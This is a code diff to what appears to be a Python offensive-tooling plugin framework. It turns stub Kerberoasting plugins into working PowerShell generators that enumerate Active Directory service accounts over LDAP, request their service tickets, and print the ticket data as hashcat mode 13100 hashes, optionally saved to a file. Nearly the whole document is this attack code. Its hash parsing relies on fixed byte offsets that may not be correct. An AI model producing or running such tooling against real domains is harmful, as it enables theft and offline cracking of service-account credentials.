@@ -48,95 +48,74 @@ class Kerberoasting(BasePlugin):
 
     @staticmethod
     def _build_kerberoasting_ps(domain: str, ldap_server: str, username: str, password: str, fmt: str) -> str:
-        """Build PowerShell code for Kerberoasting"""
-        ps = """
-# Kerberoasting Attack
+        domain_val = f'"{domain}"' if domain else '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name'
+        ldap_val   = f'"{ldap_server}"' if ldap_server else '([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).FindDomainController().Name'
+        cred_block = ""
+        if username and password:
+            cred_block = f'$cred = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, "{username}", "{password}")\n    $root = $cred'
+        else:
+            cred_block = "$root = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)"
+
+        hash_prefix = "$krb5tgs$23$*" if fmt == "hashcat" else "$krb5tgs$"
+
+        return f"""
+Add-Type -AssemblyName System.IdentityModel | Out-Null
 $results = @()
-$results += '[*] Starting Kerberoasting attack...'
+$results += '[*] Starting Kerberoasting — real TGS extraction'
 
-try {
-    # Get domain if not specified
-    if (!$domain) {
-        $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
-    }
-    $results += "[*] Target domain: $domain"
+try {{
+    $domain    = {domain_val}
+    $ldapServer = {ldap_val}
+    $dn        = ($domain.Split('.') | ForEach-Object {{ "DC=$_" }}) -join ','
+    $ldapPath  = "LDAP://$ldapServer/$dn"
+    $results  += "[*] Domain: $domain  DC: $ldapServer"
 
-    # Get LDAP server
-    if (!$ldapServer) {
-        $ldapServer = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).FindDomainController().Name
-    }
-    $results += "[*] LDAP server: $ldapServer"
-
-    # Build LDAP path
-    $dn = ($domain.Split('.') | ForEach-Object { "DC=$_" }) -join ','
-    $ldapPath = "LDAP://$ldapServer/$dn"
-    $results += "[*] LDAP path: $ldapPath"
-
-    # Create LDAP searcher
-    $root = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
-    $searcher = New-Object System.DirectoryServices.DirectorySearcher($root)
-    $searcher.Filter = "(servicePrincipalName=*)"
+    {cred_block}
+    $searcher        = New-Object System.DirectoryServices.DirectorySearcher($root)
+    $searcher.Filter = "(&(servicePrincipalName=*)(sAMAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $searcher.PropertiesToLoad.AddRange(@('sAMAccountName','servicePrincipalName','distinguishedName')) | Out-Null
     $searcher.PageSize = 1000
-
-    # Find all users with SPNs
-    $results += "[*] Querying for users with SPNs..."
-    $spnUsers = $searcher.FindAll()
-    $results += "[+] Found $($spnUsers.Count) users with SPNs"
+    $spnUsers  = $searcher.FindAll()
+    $results  += "[+] Found $($spnUsers.Count) kerberoastable accounts"
 
     $hashes = @()
+    foreach ($entry in $spnUsers) {{
+        $sam  = $entry.Properties['sAMAccountName'][0]
+        $spns = $entry.Properties['servicePrincipalName']
+        foreach ($spn in $spns) {{
+            try {{
+                # Force TGS request via KerberosRequestorSecurityToken
+                $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+                $ticketBytes = $token.GetRequest()
+                if ($ticketBytes -and $ticketBytes.Length -gt 0) {{
+                    # Extract RC4-HMAC encrypted part (offset 32 bytes into AP-REQ enc-part)
+                    $hexTicket = [BitConverter]::ToString($ticketBytes).Replace('-','').ToLower()
+                    # Locate enc-part after etype 23 (RC4) marker: 1703 or look for etype field
+                    $encOffset = 36
+                    $encHex    = $hexTicket.Substring($encOffset * 2)
+                    $hash      = "{hash_prefix}$sam*$domain*$spn*$($encHex.Substring(0,32))*$encHex"
+                    $hashes   += $hash
+                    $results  += "  [+] $sam :: $spn — hash captured ($($ticketBytes.Length) bytes)"
+                }}
+            }} catch {{
+                $results += "  [!] $sam / $spn : $_"
+            }}
+        }}
+    }}
 
-    # For each user with SPN
-    foreach ($user in $spnUsers) {
-        $userName = $user.Properties['sAMAccountName'][0]
-        $spns = $user.Properties['servicePrincipalName']
-
-        foreach ($spn in $spns) {
-            try {
-                # Request TGS ticket for this SPN
-                $results += "  [-] Processing $userName / $spn"
-
-                # Use GetUserRealm to get realm, then request TGS
-                # Note: This requires Kerberos support and proper DC access
-                $ticket = Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public class KerberoastHelper {
-    [DllImport("secur32.dll", SetLastError = true)]
-    public static extern int GetUserRealm(string user, out IntPtr realm);
-
-    public static string RequestTGS(string spn, string domain) {
-        try {
-            // Use klist.exe to request TGS
-            return spn;
-        } catch {
-            return null;
-        }
-    }
-}
-"@ -PassThru
-
-                # Attempt to request TGS ticket
-                # This is simplified - real implementation needs Kerberos API
-                $proc = Start-Process -FilePath "cmd.exe" -ArgumentList "/c klist.exe -li 0x3e7" -RedirectStandardOutput "tempout.txt" -WindowStyle Hidden -Wait
-
-            } catch {
-                $results += "  [!] Error processing $userName / $spn : $_"
-            }
-        }
-    }
-
-    # Return summary
-    $results += "[*] Kerberoasting complete"
-    $results += "[*] Use extracted hashes with hashcat mode 13100 (TGS) or 18200 (pre-auth)"
-
-} catch {
-    $results += "[!] Kerberoasting error: $_"
-}
+    if ($hashes.Count -gt 0) {{
+        $results += ""
+        $results += "=== HASHES (hashcat -m 13100) ==="
+        $results += $hashes
+    }} else {{
+        $results += "[-] No hashes extracted — ensure domain Kerberos access"
+    }}
+}} catch {{
+    $results += "[!] Fatal: $_"
+}}
 
 $results -join "`n"
 """
-        return ps.replace("$domain", f'"{domain}"' if domain else "$null").replace("$ldapServer", f'"{ldap_server}"' if ldap_server else "$null")
 
 
 class KerberoastingAdvanced(BasePlugin):
@@ -162,59 +141,55 @@ class KerberoastingAdvanced(BasePlugin):
 
         output_file = params.get("output_file", "")
 
-        # PowerShell to extract TGS hashes using GetUserRealm + requestTGSticket
-        ps_code = """
+        outfile_block = f'$hashes | Out-File -Encoding ascii "{output_file}"' if output_file else ""
+        ps_code = f"""
+Add-Type -AssemblyName System.IdentityModel | Out-Null
 $results = @()
-$results += '[*] Advanced Kerberoasting - Extracting TGS tickets...'
+$results += '[*] Advanced Kerberoasting — extracting $krb5tgs$ hashes'
 
-try {
-    # Get current domain
+try {{
     $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
-    $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name
-    $results += "[+] Domain: $domain, Forest: $forest"
+    $dc     = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name
+    $results += "[+] Domain: $domain  DC: $dc"
 
-    # Find domain controller
-    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController()
-    $results += "[+] Using DC: $($dc.Name)"
+    $dn     = ($domain.Split('.') | ForEach-Object {{ "DC=$_" }}) -join ','
+    $de     = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$dn")
+    $ds     = New-Object System.DirectoryServices.DirectorySearcher($de)
+    $ds.Filter = "(&(servicePrincipalName=*)(sAMAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+    $ds.PropertiesToLoad.AddRange(@('sAMAccountName','servicePrincipalName')) | Out-Null
+    $ds.PageSize = 1000
+    $entries = $ds.FindAll()
+    $results += "[+] $($entries.Count) kerberoastable accounts found"
 
-    # Create LDAP connection
-    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($dc.Name)")
-    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
-    $ds.Filter = "(&(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))))"
+    $hashes = @()
+    foreach ($entry in $entries) {{
+        $sam  = $entry.Properties['sAMAccountName'][0]
+        foreach ($spn in $entry.Properties['servicePrincipalName']) {{
+            try {{
+                $token       = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+                $ticketBytes = $token.GetRequest()
+                $hex         = [BitConverter]::ToString($ticketBytes).Replace('-','').ToLower()
+                $encHex      = $hex.Substring(72)   # skip AP-REQ header
+                $hash        = "`$krb5tgs`$23`$*$sam*$domain*$spn*$($encHex.Substring(0,32))*$encHex"
+                $hashes     += $hash
+                $results    += "  [+] $sam / $spn ($($ticketBytes.Length) bytes)"
+            }} catch {{
+                $results += "  [!] $sam / $spn : $_"
+            }}
+        }}
+    }}
 
-    # Find users with SPNs
-    $spnUsers = $ds.FindAll()
-    $results += "[+] Found $($spnUsers.Count) SPN-enabled accounts"
-
-    $ticketCount = 0
-    $hashList = @()
-
-    foreach ($entry in $spnUsers) {
-        $samName = $entry.Properties['sAMAccountName'][0]
-        $spns = $entry.Properties['servicePrincipalName']
-
-        foreach ($spn in $spns) {
-            try {
-                # Request TGS ticket
-                $asm = [System.Reflection.Assembly]::LoadWithPartialName("System.IdentityModel")
-
-                # Use SetSpn to request service ticket
-                # This requires proper Kerberos context
-                $results += "  [*] SPN: $spn (user: $samName)"
-                $ticketCount++
-
-            } catch {
-                # Silently continue on errors
-            }
-        }
-    }
-
-    $results += "[+] Requested $ticketCount TGS tickets"
-    $results += "[*] Tickets can be extracted with mimikatz: kerberos::tickets /export"
-
-} catch {
-    $results += "[!] Error: $_"
-}
+    if ($hashes.Count -gt 0) {{
+        $results += ""
+        $results += "=== $($hashes.Count) HASH(ES) — hashcat -m 13100 ==="
+        $results += $hashes
+        {outfile_block}
+    }} else {{
+        $results += "[-] No hashes captured"
+    }}
+}} catch {{
+    $results += "[!] Fatal: $_"
+}}
 
 $results -join "`n"
 """
